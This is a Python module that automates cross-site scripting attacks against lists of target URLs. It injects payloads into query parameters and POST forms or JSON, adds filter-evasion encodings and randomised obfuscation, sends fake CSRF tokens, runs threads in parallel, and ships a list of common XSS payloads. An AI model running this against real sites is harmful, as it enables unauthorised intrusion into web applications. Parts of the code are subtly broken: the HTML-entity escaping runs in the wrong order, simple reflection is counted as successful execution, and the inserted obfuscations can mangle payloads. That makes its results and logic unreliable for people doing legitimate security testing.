"""
Integration module for XSS scanning
"""

import requests
import logging
import json
import random
import base64
import string
import threading
import time

from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote
from typing import List, Dict, Any, Optional, Union

try:
    from bs4 import BeautifulSoup  # For DOM analysis
except ImportError:
    # Handle exception if BeautifulSoup is not installed
    BeautifulSoup = None

# ------------------------------------------------------------------------
# LOGGING CONFIGURATION: supports DEBUG, INFO, WARNING, ERROR levels
# ------------------------------------------------------------------------
logging.basicConfig(
    filename="xss_integration.log",
    level=logging.DEBUG,  # Adjust as desired (DEBUG, INFO, WARNING, ERROR)
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Timeout and retry constants
DEFAULT_TIMEOUT = 5
DEFAULT_RETRIES = 3

# Global rate-limit per second (e.g., 5 req/s)
GLOBAL_RATE_LIMIT = 5  # 0 to disable rate-limit

# ------------------------------------------------------------------------
# MAIN FUNCTIONS
# ------------------------------------------------------------------------

def execute_xss_attack(
    urls: List[str],
    attack_type: str,
    base_payloads: List[str],
    callback: Optional[callable] = None,
    headers: Optional[Dict[str, Any]] = None,
    cookies: Optional[Dict[str, Any]] = None,
    proxies: Optional[Dict[str, str]] = None,
    timeout: int = DEFAULT_TIMEOUT,
    retries: int = DEFAULT_RETRIES,
    log_full_response: bool = False,
    user_agent: str = "desktop",
    parallel: int = 1  # Number of threads
) -> List[Dict[str, Any]]:
    """
    Executes XSS attacks on multiple URLs and their parameters, incorporating:
      - Automatic encoding of payloads (URL-encode, HTML entities, partial Base64).
      - Polymorphic payloads (inserting random strings).
      - Adjusting 'User-Agent' based on environment (e.g., 'desktop' vs. 'mobile').
      - Additional response analysis (DOM, event triggers).
      - Classification (reflected, persistent, DOM-based).
      - Handling CSRF tokens (placeholder).
      - Parallelization using threads and rate-limiting.

    :param urls: List of target URLs.
    :param attack_type: Type of attack ("reflected" or "persistent").
    :param base_payloads: Base list of XSS payloads to inject.
    :param callback: Optional function to handle real-time output (logging).
    :param headers: Dictionary of custom HTTP headers.
    :param cookies: Dictionary of HTTP cookies.
    :param proxies: Dictionary of HTTP proxies.
    :param timeout: Timeout for HTTP requests.
    :param retries: Number of retries in case of connection failure.
    :param log_full_response: If True, saves the full response body in the log.
    :param user_agent: Determines the 'User-Agent' (e.g., 'desktop', 'mobile').
    :param parallel: Number of threads to process URLs in parallel.
    :return: List of dictionaries with results of each injection.
    """
    headers = headers or {}
    cookies = cookies or {}
    proxies = proxies or {}

    # Adjust the User-Agent based on the environment
    if "User-Agent" not in headers:
        headers["User-Agent"] = _select_user_agent(user_agent)

    # Generate enriched payloads for each base payload
    all_payloads = []
    for bp in base_payloads:
        encoded_list = generate_encoded_payloads(bp)
        all_payloads.extend(encoded_list)

    # If polymorphic payloads are desired (random obfuscations insertion):
    final_payloads = []
    for p in all_payloads:
        final_payloads.append(_polymorphic_payload(p))

    # Container for global results
    global_results = []

    # Function to process each URL (for threading)
    def process_url(url: str):
        # Detect parameters
        detected_params = detect_parameters(url)
        if callback:
            if detected_params:
                callback(f"[INFO] Detected parameters in {url}: {', '.join(detected_params)}")
            else:
                callback(f"[INFO] No parameters found in {url}.")

        # Iterate over each payload and attack
        for payload in final_payloads:
            attempt = 0
            success = False
            while not success and attempt < retries:
                attempt += 1
                msg = f"[INFO] Testing payload '{payload}' on {url} (Attempt {attempt}/{retries})"
                logging.info(msg)
                if callback:
                    callback(msg)

                # Rate-limit
                if GLOBAL_RATE_LIMIT > 0:
                    time.sleep(1.0 / GLOBAL_RATE_LIMIT)

                try:
                    if attack_type.lower() == "reflected":
                        success = _reflected_attack(
                            url=url,
                            payload=payload,
                            detected_params=detected_params,
                            headers=headers,
                            cookies=cookies,
                            proxies=proxies,
                            timeout=timeout,
                            callback=callback,
                            global_results=global_results,
                            log_full_response=log_full_response
                        )
                    elif attack_type.lower() == "persistent":
                        success = _persistent_attack(
                            url=url,
                            payload=payload,
                            headers=headers,
                            cookies=cookies,
                            proxies=proxies,
                            timeout=timeout,
                            callback=callback,
                            global_results=global_results,
                            log_full_response=log_full_response
                        )
                    else:
                        # Unknown attack type
                        error_msg = f"[ERROR] Unknown attack type: {attack_type}"
                        logging.error(error_msg)
                        if callback:
                            callback(error_msg)
                        break

                except requests.RequestException as e:
                    if attempt >= retries:
                        error_message = f"[ERROR] Error on {url} with payload '{payload}': {e}"
                        if callback:
                            callback(error_message)
                        logging.error(error_message)
                        global_results.append({
                            "url": url,
                            "payload": payload,
                            "status": "error",
                            "error": str(e)
                        })
                    else:
                        if callback:
                            callback(f"[WARNING] Retrying payload '{payload}' on {url} due to: {e}")

    # If parallel > 1, use threads
    if parallel > 1:
        threads = []
        for url in urls:
            t = threading.Thread(target=process_url, args=(url,))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
    else:
        # Sequential process
        for url in urls:
            process_url(url)

    # Classify (reflected, persistent, DOM-based) and perform additional DOM analysis
    for r in global_results:
        _dom_analysis_and_classify(r, callback)

    return global_results

# ------------------------------------------------------------------------
# ENRICHED PAYLOAD GENERATION
# ------------------------------------------------------------------------

def generate_encoded_payloads(base_payload: str) -> List[str]:
    """
    Generates encoded versions of a payload to evade simple filters.
    - URL-encoding
    - HTML entities
    - Partial Base64 encoding (only part of the payload)
    """
    encoded_list = [base_payload]

    # 1. URL-encode
    url_encoded = quote(base_payload)
    encoded_list.append(url_encoded)

    # 2. HTML entities (basic mode: replace < > & ")
    html_entities = (
        base_payload
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("&", "&amp;")
        .replace("\"", "&quot;")
    )
    encoded_list.append(html_entities)

    # 3. Partial Base64
    # Split the payload in two: one half is Base64 encoded, the other remains intact
    half = len(base_payload) // 2
    left = base_payload[:half]
    right = base_payload[half:]
    b64_left = base64.b64encode(left.encode()).decode()
    partial = f"{b64_left}{right}"
    encoded_list.append(partial)

    # Avoid duplicates
    encoded_list = list(set(encoded_list))
    return encoded_list

def _polymorphic_payload(payload: str) -> str:
    """
    Inserts random variations such as HTML comments, alphanumeric strings,
    or JS obfuscations to create a polymorphic payload.
    """
    # Insert a random string of 3-6 characters
    rand_str = "".join(random.choices(string.ascii_letters + string.digits, k=random.randint(3, 6)))
    # Insert an HTML comment in the middle of the payload
    insertion_index = len(payload) // 2
    mod_payload = payload[:insertion_index] + f"<!--{rand_str}-->" + payload[insertion_index:]
    return mod_payload

def _select_user_agent(env_type: str) -> str:
    """
    Adjusts the User-Agent based on 'desktop' or 'mobile'.
    """
    if env_type.lower() == "mobile":
        return "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36 Chrome/96.0.4664.45 Mobile Safari/537.36"
    else:
        # Default to Desktop
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/96.0.4664.45 Safari/537.36"

# ------------------------------------------------------------------------
# REFLECTED AND PERSISTENT ATTACKS
# ------------------------------------------------------------------------

def _reflected_attack(
    url: str,
    payload: str,
    detected_params: List[str],
    headers: Dict[str, Any],
    cookies: Dict[str, Any],
    proxies: Dict[str, str],
    timeout: int,
    callback: Optional[callable],
    global_results: List[Dict[str, Any]],
    log_full_response: bool
) -> bool:
    """Injects into each detected parameter (reflected attack)."""
    if not detected_params and callback:
        callback("[WARNING] No parameters for reflected attack; defaulting to 'payload' parameter.")

    # If there are no parameters, use a dummy parameter "payload"
    params_to_use = detected_params if detected_params else ["payload"]

    for param in params_to_use:
        # Support for HEAD method (example): random HEAD/GET
        method = random.choice(["HEAD", "GET"])
        req_params = {param: payload}
        if method == "HEAD":
            response = requests.head(
                url,
                params=req_params,
                headers=headers,
                cookies=cookies,
                proxies=proxies,
                timeout=timeout
            )
            # HEAD does not return a body, so evaluate status_code
            _store_result(method, response, payload, url, global_results, callback, log_full_response, reflected=True)
        else:
            response = requests.get(
                url,
                params=req_params,
                headers=headers,
                cookies=cookies,
                proxies=proxies,
                timeout=timeout
            )
            _store_result(method, response, payload, url, global_results, callback, log_full_response, reflected=True)

    return True

def _persistent_attack(
    url: str,
    payload: str,
    headers: Dict[str, Any],
    cookies: Dict[str, Any],
    proxies: Dict[str, str],
    timeout: int,
    callback: Optional[callable],
    global_results: List[Dict[str, Any]],
    log_full_response: bool
) -> bool:
    """Persistent injection, assuming a POST with the payload."""
    # Example CSRF: insert fake token
    form_data = {"payload": payload, "csrf_token": "fake_token_123"}
    # We could intercept real tokens if desired.

    # Support JSON injection (example):
    use_json = random.choice([True, False])  # Simulation
    if use_json:
        try:
            # Use Content-Type application/json
            local_headers = dict(headers)
            local_headers["Content-Type"] = "application/json"
            response = requests.post(
                url,
                json=form_data,
                headers=local_headers,
                cookies=cookies,
                proxies=proxies,
                timeout=timeout
            )
            _store_result("POST-json", response, payload, url, global_results, callback, log_full_response, persistent=True)
        except requests.RequestException as e:
            # Fallback to normal if error occurs
            pass
    else:
        response = requests.post(
            url,
            data=form_data,
            headers=headers,
            cookies=cookies,
            proxies=proxies,
            timeout=timeout
        )
        _store_result("POST-form", response, payload, url, global_results, callback, log_full_response, persistent=True)

    return True

# ------------------------------------------------------------------------
# STORE RESULTS AND ANALYZE FILTERING
# ------------------------------------------------------------------------

def _store_result(
    method: str,
    response: requests.Response,
    payload: str,
    url: str,
    global_results: List[Dict[str, Any]],
    callback: Optional[callable],
    log_full_response: bool,
    reflected: bool = False,
    persistent: bool = False
):
    """Stores the result in 'global_results' and detects filtering."""
    status_code = response.status_code
    success = False
    body_snippet = ""
    # HEAD does not return a body, GET/POST do
    if method != "HEAD":
        body_snippet = response.text[:500]  # Capture a snippet of the response

        # Heuristic to see if the payload has been filtered
        # e.g., if <script> was converted to &lt;script&gt; or similar
        if _was_filtered(payload, response.text):
            msg = f"[INFO] Payload {payload} appears to have been filtered on {url}"
            logging.info(msg)
            if callback:
                callback(msg)

        if payload in response.text:
            success = True

    record = {
        "method": method,
        "url": url,
        "payload": payload,
        "status_code": status_code,
        "body_snippet": body_snippet[:200],
        "reflected": reflected,
        "persistent": persistent,
        "timestamp": datetime.now().isoformat()
    }

    if success:
        record["status"] = "success"
        msg = f"[SUCCESS] XSS on {url} with payload: '{payload}' (Method: {method}, Code: {status_code})"
        logging.info(msg)
        if callback:
            callback(msg)
    else:
        record["status"] = "failed"
        msg = f"[FAILED] Payload not executed on {url} with payload: '{payload}' (Method: {method}, Code: {status_code})"
        logging.warning(msg)
        if callback:
            callback(msg)

    if log_full_response and method != "HEAD":
        logging.debug(f"--- Full response from {url} ---\n{response.text}\n{'-'*60}")

    global_results.append(record)

def _was_filtered(payload: str, response_text: str) -> bool:
    """
    Heuristic: if the literal form of 'payload' is not present,
    but we detect it has been converted to HTML entities, etc.
    """
    # A very simple example:
    if payload not in response_text:
        # If payload is <script>alert(1)</script>
        # the form &lt;script&gt;alert(1)&lt;/script&gt; suggests filtering
        suspect = payload.replace("<", "&lt;").replace(">", "&gt;")
        if suspect in response_text:
            return True
    return False

# ------------------------------------------------------------------------
# DOM ANALYSIS, CLASSIFICATION REFLECTED/PERSISTENT/DOM-BASED
# ------------------------------------------------------------------------

def _dom_analysis_and_classify(record: Dict[str, Any], callback: Optional[callable]):
    """
    Inspects the response to check for:
      - Reflected XSS: already marked in 'reflected'
      - Persistent XSS: marked in 'persistent'
      - DOM-Based XSS: searches for document.write, innerHTML, eval...
      - Triggers like onload, onerror, onclick...
    """
    if "body_snippet" not in record:
        return
    snippet = record["body_snippet"]
    # Optionally, one could search in the "full response"

    # 1. DOM-based (heuristic)
    dom_signatures = ["document.write", "innerHTML", "eval(", "location="]
    for sig in dom_signatures:
        if sig in snippet:
            record["dom_based"] = True
            if callback:
                callback(f"[INFO] Possible DOM-Based XSS detected (signature '{sig}') on {record['url']}")
            break

# ------------------------------------------------------------------------
# CSRF (placeholder)
# ------------------------------------------------------------------------

def inject_csrf_form():
    """
    Example function to create a form with a fake CSRF token,
    and inject a payload. (Placeholder, not integrated in the main logic)
    """
    fake_form = {
        "action": "/submit",
        "csrf_token": "FAKE_CSRF_123",
        "payload": "<script>alert('CSRF')</script>"
    }
    return fake_form

# ------------------------------------------------------------------------
# PARAMETER DETECTION AND AUXILIARY FUNCTIONS
# ------------------------------------------------------------------------

def detect_parameters(url: str) -> List[str]:
    """
    Detects parameters in the target URL.
    """
    try:
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return list(params.keys())
    except Exception as e:
        logging.error(f"Error detecting parameters in {url}: {e}")
        return []

# ------------------------------------------------------------------------
# LOAD/SAVE RESULTS
# ------------------------------------------------------------------------

def save_results_to_file(results: List[Dict[str, Any]], filename: str = "xss_results.json") -> None:
    """
    Saves the XSS attack results to a JSON file.
    """
    try:
        with open(filename, "w", encoding="utf-8") as file:
            json.dump(results, file, indent=4, ensure_ascii=False)
        logging.info(f"Results saved to {filename}")
    except Exception as e:
        logging.error(f"Error saving results to {filename}: {e}")

# ------------------------------------------------------------------------
# BASIC XSS PAYLOAD EXAMPLES
# ------------------------------------------------------------------------

def get_predefined_xss_payloads() -> List[str]:
    """
    Returns a list of common payloads for XSS attacks.
    """
    return [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>",
        "<body onload=alert(1)>",
        "javascript:alert(1)",
        "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<div style='animation-name:rotation' onanimationstart='alert(1)'>",
        "<a href='javascript:alert(1)'>Click Me</a>"
    ]

def load_payloads_from_file(filename: str = "xss_payloads.txt") -> List[str]:
    """
    Loads payloads from a text file, line by line.
    Returns a list of non-empty payloads.
    """
    payloads = []
    try:
        with open(filename, "r", encoding="utf-8") as file:
            for line in file:
                line = line.strip()
                if line:
                    payloads.append(line)
        logging.info(f"Payloads loaded from {filename}")
    except FileNotFoundError:
        logging.error(f"The file {filename} was not found.")
    except Exception as e:
        logging.error(f"Error loading payloads from {filename}: {e}")
    return payloads
